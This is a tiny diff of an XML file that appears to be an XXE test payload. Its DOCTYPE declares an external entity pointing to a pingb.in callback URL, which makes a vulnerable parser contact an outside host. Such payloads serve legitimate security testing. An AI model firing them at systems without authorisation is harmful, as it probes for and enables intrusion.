@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE roottag [
+<!DOCTYPE roottag [ <!ELEMENT http ANY>
 <!ENTITY http SYSTEM "http://pingb.in/p/4cd02dfed1c894c72e0752a5a99a";>
 ]>
 <test>
